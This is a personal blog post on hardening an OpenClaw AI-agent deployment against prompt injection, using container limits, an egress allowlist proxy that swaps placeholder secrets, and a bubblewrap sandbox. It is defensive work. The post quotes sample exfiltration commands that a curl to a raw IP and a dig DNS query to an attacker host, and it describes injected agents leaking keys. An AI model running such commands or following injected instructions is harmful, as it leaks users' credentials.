@@ -1,0 +1,938 @@
+<!DOCTYPE html><html lang="en"><head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>How I Hardened My OpenClaw Deployment</title>
+		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+		<!-- Google tag (gtag.js) -->
+		<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-H9QR43SSJG"></script>
+		
+		<meta name="description" content="Declawing OpenClaw with cap-drop: ALL, mitmproxy and bubblewrap">
+		<link rel="alternate" href="/feed/feed.xml" type="application/atom+xml" title="Dead Letters">
+		
+		
+		
+		<style>/* This is an arbitrary CSS string added to the bundle */
+/* Defaults */
+:root {
+	--font-family: -apple-system, system-ui, sans-serif;
+	--font-family-monospace: Consolas, Menlo, Monaco, Andale Mono WT, Andale Mono, Lucida Console, Lucida Sans Typewriter, DejaVu Sans Mono, Bitstream Vera Sans Mono, Liberation Mono, Nimbus Mono L, Courier New, Courier, monospace;
+}
+
+/* Theme colors */
+:root {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #333;
+
+	--background-color: #fff;
+
+	--warn: #fff0b6;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #fa8072;
+	--text-color-link-active: #e9967a;
+	--text-color-link-visited: #cd5c5c;
+
+	--syntax-tab-size: 2;
+}
+
+/* Dark theme colors */
+:root[data-theme="dark"] {
+	--color-gray-20: #e0e0e0;
+	--color-gray-50: #C0C0C0;
+	--color-gray-90: #dad8d8;
+
+	--warn: #a78912;
+
+	--text-color: var(--color-gray-90);
+	--text-color-link: #fa8072;
+	--text-color-link-active: #ffa07a;
+	--text-color-link-visited: #e9967a;
+
+	--background-color: #15202b;
+}
+
+/* Auto dark mode (when no manual preference is set) */
+@media (prefers-color-scheme: dark) {
+	:root:not([data-theme]) {
+		--color-gray-20: #e0e0e0;
+		--color-gray-50: #C0C0C0;
+		--color-gray-90: #dad8d8;
+
+		--warn: #a78912;
+
+		--text-color: var(--color-gray-90);
+		--text-color-link: #fa8072;
+		--text-color-link-active: #ffa07a;
+		--text-color-link-visited: #e9967a;
+
+		--background-color: #15202b;
+	}
+}
+
+
+/* Global stylesheet */
+* {
+	box-sizing: border-box;
+}
+
+@view-transition {
+	navigation: auto;
+}
+
+@keyframes slide-up {
+	from {
+		opacity: 0;
+		transform: translateY(50px);
+	}
+	to {
+		opacity: 1;
+		transform: translateY(0);
+	}
+}
+
+@keyframes fade-in {
+	from {
+		opacity: 0;
+	}
+	to {
+		opacity: 1;
+	}
+}
+
+header {
+	view-transition-name: header;
+}
+
+/* Prevent header movement. Hide old header immediately so it doesn't bleed through transparent background */
+::view-transition-group(header) {
+	animation: none;
+}
+
+::view-transition-old(header) {
+	display: none;
+}
+
+::view-transition-new(header) {
+	animation: none;
+	mix-blend-mode: normal;
+}
+
+footer {
+	view-transition-name: footer;
+}
+
+/* Prevent footer movement (sliding) */
+::view-transition-group(footer) {
+	animation: none;
+}
+
+::view-transition-new(root)
+{
+	animation: slide-up 0.3s ease forwards;
+}
+
+::view-transition-old(root)
+{
+	animation: slide-up 0.05s ease reverse forwards;
+}
+
+/* Fade in footer after content is done */
+::view-transition-new(footer)
+{
+	opacity: 0;
+	animation: fade-in 0.3s ease forwards;
+	animation-delay: 0.3s;
+}
+
+::view-transition-old(footer)
+{
+	display: none;
+}
+
+
+html,
+body {
+	padding: 0;
+	margin: 0 auto;
+	font-family: var(--font-family);
+	color: var(--text-color);
+	background-color: var(--background-color);
+}
+html {
+	overflow-y: scroll;
+}
+body {
+	max-width: 40em;
+}
+
+/* https://www.a11yproject.com/posts/how-to-hide-content/ */
+.visually-hidden:not(:focus):not(:active) {
+	clip: rect(0 0 0 0);
+	clip-path: inset(50%);
+	height: 1px;
+	overflow: hidden;
+	position: absolute;
+	white-space: nowrap;
+	width: 1px;
+}
+
+/* Fluid images via https://www.zachleat.com/web/fluid-images/ */
+img{
+  max-width: 100%;
+}
+img[width][height] {
+  height: auto;
+}
+img[src$=".svg"] {
+  width: 100%;
+  height: auto;
+  max-width: none;
+}
+video,
+iframe {
+	width: 100%;
+	height: auto;
+}
+iframe {
+	aspect-ratio: 16/9;
+}
+
+p:last-child {
+	margin-bottom: 0;
+}
+p {
+	line-height: 1.5;
+}
+
+li {
+	line-height: 1.5;
+}
+
+a[href] {
+	color: var(--text-color-link);
+}
+a[href]:visited {
+	color: var(--text-color-link-visited);
+}
+a[href]:hover,
+a[href]:active {
+	color: var(--text-color-link-active);
+}
+
+main,
+footer {
+	padding: 1rem;
+}
+main :first-child {
+	margin-top: 0;
+}
+
+header {
+	border-bottom: 1px dashed var(--color-gray-20);
+}
+
+#skip-link {
+	text-decoration: none;
+	background: var(--background-color);
+	color: var(--text-color);
+	padding: 0.5rem 1rem;
+	border: 1px solid var(--color-gray-90);
+	border-radius: 2px;
+}
+
+/* Prevent visually-hidden skip link fom pushing content around when focused */
+#skip-link.visually-hidden:focus {
+	position: absolute;
+	top: 1rem;
+	left: 1rem;
+	/* Ensure it is positioned on top of everything else when it is shown */
+	z-index: 999;
+}
+
+.links-nextprev {
+	display: flex;
+	justify-content: space-between;
+	gap: .5em 1em;
+	list-style: "";
+	border-top: 1px dashed var(--color-gray-20);
+	padding: 1em 0;
+}
+.links-nextprev > * {
+	flex-grow: 1;
+}
+.links-nextprev-next {
+	text-align: right;
+}
+
+table {
+	margin: 1em 0;
+}
+table td,
+table th {
+	padding-right: 1em;
+}
+
+pre,
+code {
+	font-family: var(--font-family-monospace);
+}
+pre:not([class*="language-"]) {
+	margin: .5em 0;
+	line-height: 1.375; /* 22px /16 */
+	-moz-tab-size: var(--syntax-tab-size);
+	-o-tab-size: var(--syntax-tab-size);
+	tab-size: var(--syntax-tab-size);
+	-webkit-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+	direction: ltr;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	overflow-x: auto;
+}
+code {
+	word-break: break-all;
+}
+
+/* Header */
+header {
+	display: flex;
+	gap: 1em;
+	flex-wrap: wrap;
+	justify-content: space-between;
+	align-items: center;
+	padding: 1em;
+}
+.home-link {
+	flex-grow: 1;
+	font-size: 1em; /* 16px /16 */
+	font-weight: 700;
+}
+.home-link:link:not(:hover) {
+	text-decoration: none;
+}
+
+/* Old post banner */
+.old-post-banner {
+	background-color: var(--warn);
+	color: var(--text-color);
+	border-radius: 4px;
+	padding: 1em;
+	margin-bottom: 1em;
+}
+
+/* Nav */
+.nav {
+	display: flex;
+	gap: .5em 1em;
+	padding: 0;
+	margin: 0;
+	list-style: none;
+}
+.nav-item {
+	display: inline-block;
+}
+.nav-item a[href]:not(:hover) {
+	text-decoration: none;
+}
+.nav a[href][aria-current="page"] {
+	text-decoration: underline;
+}
+
+/* Theme toggle */
+.theme-toggle {
+	background: none;
+	border: 1px solid var(--color-gray-50);
+	border-radius: 4px;
+	color: var(--text-color);
+	cursor: pointer;
+	font-size: 0.8em;
+	padding: 0.25em 0.5em;
+	transition: all 0.2s ease;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	min-width: 2.5em;
+}
+.theme-toggle:hover {
+	border-color: var(--text-color-link);
+	background-color: var(--color-gray-20);
+	opacity: 0.8;
+}
+.theme-toggle:focus {
+	outline: 2px solid var(--text-color-link);
+	outline-offset: 2px;
+}
+
+/* Posts list */
+.postlist {
+	counter-reset: start-from var(--postlist-index);
+	list-style: none;
+	padding: 0;
+	padding-left: 1.5rem;
+}
+.postlist-item {
+	display: flex;
+	flex-wrap: wrap;
+	align-items: baseline;
+	counter-increment: start-from -1;
+	margin-bottom: 1em;
+}
+.postlist-item:before {
+	display: inline-block;
+	pointer-events: none;
+	content: "" counter(start-from, decimal-leading-zero) ". ";
+	line-height: 100%;
+	text-align: right;
+	margin-left: -1.5rem;
+}
+.postlist-date,
+.postlist-item:before {
+	font-size: 0.8125em; /* 13px /16 */
+	color: var(--color-gray-90);
+}
+.postlist-date {
+	word-spacing: -0.5px;
+}
+.postlist-link {
+	font-size: 1.1875em; /* 19px /16 */
+	font-weight: 700;
+	flex-basis: calc(100% - 1.5rem);
+	padding-left: .25em;
+	padding-right: .5em;
+	text-underline-position: from-font;
+	text-underline-offset: 0;
+	text-decoration-thickness: 1px;
+}
+.postlist-item-active .postlist-link {
+	font-weight: bold;
+}
+
+/* Tags */
+.post-tag {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	text-transform: capitalize;
+	font-style: italic;
+}
+.postlist-item > .post-tag {
+	align-self: center;
+}
+
+/* Tags list */
+.post-metadata {
+	display: inline-flex;
+	flex-wrap: wrap;
+	gap: .5em;
+	list-style: none;
+	padding: 0;
+	margin: 0;
+}
+.post-metadata time {
+	margin-right: 1em;
+}
+
+
+/* External Link Indicator */
+.external-link::after {
+content: "↗";
+padding-left: 0.2em;
+font-size: 0.8em;
+opacity: 0.7;
+display: inline-block;
+text-decoration: none;
+}
+
+/* Stylize hr */
+hr {
+	border: none;
+}
+
+hr::after {
+	content: ". . .";
+	display: block;
+	text-align: center;
+}
+/**
+ * okaidia theme for JavaScript, CSS and HTML
+ * Loosely based on Monokai textmate theme by http://www.monokai.nl/
+ * @author ocodia
+ */
+
+code[class*="language-"],
+pre[class*="language-"] {
+	color: #f8f8f2;
+	background: none;
+	text-shadow: 0 1px rgba(0, 0, 0, 0.3);
+	font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+	font-size: 1em;
+	text-align: left;
+	white-space: pre;
+	word-spacing: normal;
+	word-break: normal;
+	word-wrap: normal;
+	line-height: 1.5;
+
+	-moz-tab-size: 4;
+	-o-tab-size: 4;
+	tab-size: 4;
+
+	-webkit-hyphens: none;
+	-moz-hyphens: none;
+	-ms-hyphens: none;
+	hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+	padding: 1em;
+	margin: .5em 0;
+	overflow: auto;
+	border-radius: 0.3em;
+}
+
+:not(pre) > code[class*="language-"],
+pre[class*="language-"] {
+	background: #272822;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+	padding: .1em;
+	border-radius: .3em;
+	white-space: normal;
+}
+
+.token.comment,
+.token.prolog,
+.token.doctype,
+.token.cdata {
+	color: #8292a2;
+}
+
+.token.punctuation {
+	color: #f8f8f2;
+}
+
+.token.namespace {
+	opacity: .7;
+}
+
+.token.property,
+.token.tag,
+.token.constant,
+.token.symbol,
+.token.deleted {
+	color: #f92672;
+}
+
+.token.boolean,
+.token.number {
+	color: #ae81ff;
+}
+
+.token.selector,
+.token.attr-name,
+.token.string,
+.token.char,
+.token.builtin,
+.token.inserted {
+	color: #a6e22e;
+}
+
+.token.operator,
+.token.entity,
+.token.url,
+.language-css .token.string,
+.style .token.string,
+.token.variable {
+	color: #f8f8f2;
+}
+
+.token.atrule,
+.token.attr-value,
+.token.function,
+.token.class-name {
+	color: #e6db74;
+}
+
+.token.keyword {
+	color: #66d9ef;
+}
+
+.token.regex,
+.token.important {
+	color: #fd971f;
+}
+
+.token.important,
+.token.bold {
+	font-weight: bold;
+}
+.token.italic {
+	font-style: italic;
+}
+
+.token.entity {
+	cursor: help;
+}
+/*
+ * New diff- syntax
+ */
+
+pre[class*="language-diff-"] {
+	--eleventy-code-padding: 1.25em;
+	padding-left: var(--eleventy-code-padding);
+	padding-right: var(--eleventy-code-padding);
+}
+.token.deleted {
+	background-color: hsl(0, 51%, 37%);
+	color: inherit;
+}
+.token.inserted {
+	background-color: hsl(126, 31%, 39%);
+	color: inherit;
+}
+
+/* Make the + and - characters unselectable for copy/paste */
+.token.prefix.unchanged,
+.token.prefix.inserted,
+.token.prefix.deleted {
+	-webkit-user-select: none;
+	user-select: none;
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	padding-top: 2px;
+	padding-bottom: 2px;
+}
+.token.prefix.inserted,
+.token.prefix.deleted {
+	width: var(--eleventy-code-padding);
+	background-color: rgba(0,0,0,.2);
+}
+
+/* Optional: full-width background color */
+.token.inserted:not(.prefix),
+.token.deleted:not(.prefix) {
+	display: block;
+	margin-left: calc(-1 * var(--eleventy-code-padding));
+	margin-right: calc(-1 * var(--eleventy-code-padding));
+	text-decoration: none; /* override del, ins, mark defaults */
+	color: inherit; /* override del, ins, mark defaults */
+}
+/* ---- Reactions widget ---- */
+
+#reactions {
+	margin-top: 2.5em;
+	margin-bottom: 1.5em;
+	text-align: center;
+}
+
+.reactions-heading {
+	font-size: 0.95em;
+	color: var(--color-gray-50);
+	margin-bottom: 0.6em;
+}
+
+.reactions-row {
+	display: flex;
+	justify-content: center;
+	gap: 0.5em;
+	flex-wrap: wrap;
+}
+
+.reaction-btn {
+	display: inline-flex;
+	align-items: center;
+	gap: 0.3em;
+	padding: 0.4em 0.7em;
+	border: 2px solid var(--color-gray-20);
+	border-radius: 9999px;
+	background: transparent;
+	cursor: pointer;
+	font-size: 1.15em;
+	color: var(--text-color);
+	transition: border-color 0.15s, background-color 0.15s, transform 0.1s;
+	user-select: none;
+	line-height: 1;
+}
+
+.reaction-btn:hover {
+	border-color: var(--text-color-link);
+	background: rgba(250, 128, 114, 0.08);
+}
+
+.reaction-btn:active {
+	transform: scale(0.93);
+}
+
+.reaction-btn.active {
+	border-color: var(--text-color-link);
+	background: rgba(250, 128, 114, 0.15);
+}
+
+.reaction-emoji {
+	font-size: 1.2em;
+	line-height: 1;
+}
+
+.reaction-count {
+	font-size: 0.85em;
+	min-width: 0.8em;
+	font-variant-numeric: tabular-nums;
+}</style>
+		
+		
+		
+		
+	</head>
+	<body>
+		<a href="#main" id="skip-link" class="visually-hidden">Skip to main content</a>
+
+		<header>
+			<a href="/" class="home-link">Dead Letters</a>
+			<nav>
+				<h2 class="visually-hidden" id="top-level-navigation-menu">Top level navigation menu</h2>
+				<ul class="nav">
+					<li class="nav-item"><a href="/">Home</a></li>
+					<li class="nav-item"><a href="/blog/">Archive</a></li>
+					<li class="nav-item"><a href="/about/">About</a></li>
+					<li class="nav-item"><a href="/cv/">CV</a></li>
+					<li class="nav-item"><a href="/feed/feed.xml">Feed</a></li>
+					<li class="nav-item">
+						<button class="theme-toggle" id="theme-toggle" aria-label="Toggle dark mode" title="Toggle dark mode">
+							<span class="theme-toggle-icon">🌙</span>
+						</button>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<main id="main">
+			<heading-anchors>
+				
+
+
+
+
+
+<h1 id="how-i-hardened-my-openclaw-deployment">How I Hardened My OpenClaw Deployment</h1>
+<p><em>Declawing OpenClaw with cap-drop: ALL, mitmproxy and bubblewrap</em></p>
+
+<ul class="post-metadata">
+	<li><time datetime="2026-03-02">02 March 2026</time></li>
+	<li><a href="/tags/gen-ai/" class="post-tag">gen-AI</a>, </li>
+	<li><a href="/tags/security/" class="post-tag">security</a>, </li>
+	<li><a href="/tags/linux/" class="post-tag">linux</a></li>
+</ul>
+
+<p>A few weeks ago I wrote about <a href="/blog/2026/02/10/zero-trust-llm-agent/">The Plumber With A Skeleton Key</a>,
+where I argued that giving fully autonomous AI agents unrestricted access to your machine
+is roughly as sensible as handing a random stranger on the street the keys to your house,
+your car, and your identity.</p>
+<p>This post dives into the <em>how</em> that goes a little further than a <code>docker-compose.yml</code> snippet.</p>
+<p>I built <a href="https://github.com/raka-gunarto/paranoidclaw" class="external-link" target="_blank" rel="noopener noreferrer">ParanoidClaw</a>, my own hardened
+OpenClaw setup. The goal is simple: keep using the genuinely useful parts of OpenClaw
+while assuming it <strong>will</strong> get prompt-injected or hallucinate <code>rm -rf /</code> at some point and limiting the damage when it does.</p>
+<hr>
+<h3 id="the-threat-model">The threat model</h3>
+<p>To recap, I think of the attack surface in three categories (<a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/" class="external-link" target="_blank" rel="noopener noreferrer">original credit</a> to Simon Willison, who I forgot to credit last time)</p>
+<ol>
+<li><strong>Access to Data</strong>: Secrets, SSH keys, browser sessions, files on your machine.</li>
+<li><strong>Untrusted Input</strong>: Emails, web pages, Slack messages, anything the agent reads that you don't fully control.</li>
+<li><strong>Agency</strong>: Shell access, network access, arbitrary code execution.</li>
+</ol>
+<p>A stock OpenClaw install on your server / daily driver gives you all three. ParanoidClaw's job is to make each
+of those categories as narrow as possible without making the agent useless.</p>
+<h3 id="container-hardening">Container hardening</h3>
+<p>The first and most obvious layer: don't run OpenClaw on your host machine.</p>
+<p>ParanoidClaw runs OpenClaw inside a Docker container with what I'd consider reasonable
+hardening. Here's the relevant chunk of the <code>docker-compose.yml</code>:</p>
+<pre class="language-yaml" tabindex="0"><code class="language-yaml"><span class="token key atrule">openclaw</span><span class="token punctuation">:</span>
+    <span class="token key atrule">build</span><span class="token punctuation">:</span>
+      <span class="token key atrule">context</span><span class="token punctuation">:</span> .
+      <span class="token key atrule">dockerfile</span><span class="token punctuation">:</span> Dockerfile.openclaw<span class="token punctuation">-</span>hardened
+    <span class="token key atrule">user</span><span class="token punctuation">:</span> <span class="token string">"65532:65532"</span>
+    <span class="token key atrule">cap_drop</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>ALL<span class="token punctuation">]</span>
+    <span class="token key atrule">security_opt</span><span class="token punctuation">:</span> 
+      <span class="token punctuation">-</span> no<span class="token punctuation">-</span>new<span class="token punctuation">-</span>privileges<span class="token punctuation">:</span><span class="token boolean important">true</span>
+      <span class="token punctuation">-</span> seccomp=openclaw<span class="token punctuation">-</span>seccomp.json
+      <span class="token punctuation">-</span> apparmor=openclaw<span class="token punctuation">-</span>apparmor
+    <span class="token key atrule">read_only</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
+    <span class="token key atrule">init</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>
+    <span class="token key atrule">tmpfs</span><span class="token punctuation">:</span>
+      <span class="token punctuation">-</span> /tmp<span class="token punctuation">:</span>noexec<span class="token punctuation">,</span>nosuid<span class="token punctuation">,</span>size=64m
+    <span class="token key atrule">mem_limit</span><span class="token punctuation">:</span> 2G
+    <span class="token key atrule">cpus</span><span class="token punctuation">:</span> <span class="token number">2.0</span>
+    <span class="token key atrule">pids_limit</span><span class="token punctuation">:</span> <span class="token number">200</span></code></pre>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user: "65532:65532"</code></td>
+<td>Runs as unprivileged user; container escape limits attacker access</td>
+</tr>
+<tr>
+<td><code>cap_drop: [ALL]</code></td>
+<td>Removes all Linux capabilities; no granular root powers available</td>
+</tr>
+<tr>
+<td><code>no-new-privileges: true</code></td>
+<td>Prevents privilege escalation via SUID binaries</td>
+</tr>
+<tr>
+<td><code>seccomp</code> and <code>apparmor</code> profiles</td>
+<td>These are actually slightly relaxed profiles to allow user namespaces for <a href="#bwrap-tool-sandbox">bwrap sandboxing</a></td>
+</tr>
+<tr>
+<td><code>read_only: true</code></td>
+<td>Immutable filesystem; only <code>/tmp</code> and volumes are writable</td>
+</tr>
+<tr>
+<td><code>tmpfs</code> with <code>noexec,nosuid</code></td>
+<td>Prevents binary execution and SUID exploitation in temp space</td>
+</tr>
+<tr>
+<td><code>mem_limit: 2G</code></td>
+<td>Caps memory usage via cgroups</td>
+</tr>
+<tr>
+<td><code>cpus: 2.0</code></td>
+<td>Limits CPU allocation via cgroups</td>
+</tr>
+<tr>
+<td><code>pids_limit: 200</code></td>
+<td>Prevent PID exhaustion on host</td>
+</tr>
+</tbody>
+</table>
+<p>The dockerfile itself is minimal, it simply <code>chown</code>s the <code>/app</code> dir to user 65532.</p>
+<h3 id="egress-proxy-destination-filtering">Egress proxy: destination filtering</h3>
+<p>This is the part I'm most satisfied with. Containerisation alone doesn't help you if the
+agent can still freely talk to the internet. A prompt-injected agent that can <code>curl</code>
+your secrets to an attacker-controlled server is still a disaster.</p>
+<p>ParanoidClaw routes <strong>all</strong> OpenClaw traffic through
+<a href="https://github.com/raka-gunarto/agent-panopticon" class="external-link" target="_blank" rel="noopener noreferrer">agent-panopticon</a>, a custom <code>mitmproxy</code>
+addon I wrote. The OpenClaw container has no direct network access, all traffic is forced
+through the <code>mitmproxy</code> addon via <code>iptables</code> rules.</p>
+<p>The proxy enforces a strict <strong>domain allowlist</strong>. If OpenClaw tries to reach a domain
+that's not on the list, the request gets blocked with a <code>403</code>:</p>
+<pre><code>PANOPTICON: domain 'attacker.com' is not in the egress allowlist.
+</code></pre>
+<p>It also blocks direct-IP destinations. No <code>curl https://123.45.67.89/exfil</code>. If
+it's not a domain on the allowlist, it doesn't leave the box.</p>
+<p>DNS queries are filtered too. If the agent tries to resolve a domain not on the allowlist,
+it gets an <code>NXDOMAIN</code> response. And because mitmproxy resovles the DNS through the host
+resolver, no DNS exfiltration through <code>dig @&lt;attacker-ip&gt; "my-precious-secrets.attacker.com"</code></p>
+<h3 id="egress-proxy-in-flight-secret-substitution">Egress proxy: in-flight secret substitution</h3>
+<p>The problem with giving an AI agent API keys: once it has them, a prompt injection
+can exfiltrate them. If the API key exists in the context window or if the agent can
+read the filesystem to find it, it is a risk.</p>
+<p>ParanoidClaw's approach is that <strong>OpenClaw never sees the real secrets</strong>.</p>
+<p>Instead of passing actual API keys to OpenClaw, I give it placeholder strings like
+<code>PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY</code>. The agent uses these placeholders in its
+requests like normal. When the request passes through the proxy, panopticon does
+the swap:</p>
+<ol>
+<li>OpenClaw makes a request to <code>api.anthropic.com</code> with
+<code>Authorization: Bearer PLACEHOLDER_SECRET_VALUE_ANTHROPIC_KEY</code>.</li>
+<li>The proxy checks: is <code>api.anthropic.com</code> on the allowlist? Yes.</li>
+<li>The proxy checks: is <code>ANTHROPIC_KEY</code> authorised for <code>api.anthropic.com</code>? Yes.</li>
+<li>It swaps the placeholder for the real key and forwards the request.</li>
+</ol>
+<p>If the agent gets injected and tries to send that placeholder to <code>evil.com</code>, two things
+happen: <code>evil.com</code> isn't on the allowlist so the request is blocked, and even if it
+were, the placeholder is only authorised for specific domains. The attacker gets a
+useless string either way.</p>
+<p>This extends to WebSocket messages too, for services like Discord.</p>
+<p>The real secrets live only in the proxy's environment (<code>.env.proxy</code>), which is a
+separate container that OpenClaw cannot access (outside visible filesystem, and
+effective user would have no read access either).</p>
+<h3 id="bwrap-tool-sandbox"><code>bwrap</code> tool sandbox</h3>
+<p>Containers are great for isolating the main OpenClaw process, but OpenClaw executes
+tools (shell commands, scripts, code) on behalf of the LLM. Those tool executions
+are where prompt injection actually has destructive power. The current setup wraps
+the OpenClaw main process, but I also want to ensure the tools can't mess up
+OpenClaw configuration or do anything too crazy.</p>
+<p>I modified OpenClaw to use <a href="https://github.com/containers/bubblewrap" class="external-link" target="_blank" rel="noopener noreferrer">bubblewrap</a>
+(<code>bwrap</code>) as its sandboxing backend for tool executions. <code>bwrap</code> uses Linux user
+namespaces for unprivileged sandboxing, meaning the OpenClaw process doesn't
+need root or any extra privileges.</p>
+<p>Each tool execution gets its own <code>bwrap</code> sandbox with:</p>
+<ul>
+<li>A minimal filesystem (only what the tool needs)</li>
+<li>No network access by default</li>
+<li>No access to the filesystem outside the sandbox</li>
+<li>Its own isolated namespace</li>
+</ul>
+<p>This means even if a prompt injection tricks the agent into trying to modify
+the configuration to trust some random WhatsApp number, it can't, because the
+configuration files are not mounted on the containerised root filesystem.</p>
+<p>I've opened a <a href="https://github.com/openclaw/openclaw/pull/28599" class="external-link" target="_blank" rel="noopener noreferrer">PR on the main OpenClaw repo</a>
+to get the <code>bwrap</code> backend merged.</p>
+<p>Note that OpenClaw does provide sandboxing using Docker containers, but that requires
+giving the main process access to a Docker daemon. This meant setting up a rootless
+Docker daemon if I didn't want a potential escape and host privilege escalation
+through a possible privileged container spawn. <code>bwrap</code> is a much lighter solution
+in addition to the main process already being containerised.</p>
+<h3 id="out-of-scope-pitfalls">Out-of-scope pitfalls</h3>
+<ul>
+<li><strong>LLM hallucination within allowed actions</strong>: If you gave the agent access to your
+email and it hallucinates, it can nuke everything inside the allowed scope.</li>
+<li><strong>Allowed domain abuse</strong>: If <code>api.service.com</code> is allowlisted and the agent is
+injected, it can make arbitrary API calls to that service.</li>
+</ul>
+<p>The above are policy issues, not sandboxing problems.</p>
+<h3 id="is-this-fully-secure">Is this fully secure?</h3>
+<p>Nothing is fully secure. This shrinks the blast radius by quite a bit and also
+leaves it up to the user to have sane access policies for their agent.</p>
+<p>This particular setup also still shares the host kernel, which is trade-off I've accepted.
+My server runs its services as docker containers and I wanted to keep this the same
+for the OpenClaw service. If you wanted to be extra paranoid, adding an extra boundary
+using gVisor or firecracker microVMs would be even safer (or on its own machine).
+Technically speaking, a kernel 0day would be bad news for the server this is running on.</p>
+<h3 id="why-bother">Why bother?</h3>
+<p>Because I actually want to use these tools (safely)!</p>
+<p>We know prompt injection is a fundamental, possibly unsolvable problem with the current
+LLM architecture. We know these agents have shell access and network access. We know
+they read untrusted input. The only responsible thing to do is to assume the worst and
+build accordingly.</p>
+<p>ParanoidClaw is <a href="https://github.com/raka-gunarto/paranoidclaw" class="external-link" target="_blank" rel="noopener noreferrer">on GitHub</a> if you want
+to use it or pick it apart. It's also been a genuinely fun excuse to learn more about
+Linux security hardening and networking, which might increase in demand with all these
+fully autonomous agents that can execute arbitrary commands on the rise.</p>
+
+
+
+<div id="reactions" data-slug="/blog/2026/03/02/paranoidclaw/"></div>
+<script src="/js/reactions.js" defer=""></script>
+<ul class="links-nextprev"><li class="links-nextprev-prev">← Previous<br> <a href="/blog/2026/02/26/death-of-my-craft/">3000 commits behind origin/main in 6 days</a></li>
+</ul>
+
+			</heading-anchors>
+		</main>
+
+		
+		<footer>
+			<p>
+				<em><a href="/about">Raka Gunarto</a>'s Personal Blog. Any views expressed here are my own and mine alone.</em>
+			</p>
+		</footer>
+		
+
+		<!-- This page `/blog/2026/03/02/paranoidclaw/` was built on 2026-03-02T15:48:58.570Z -->
+		<script type="module" src="/dist/TyXGoSlcTl.js"></script>
+	
+
+</body></html>
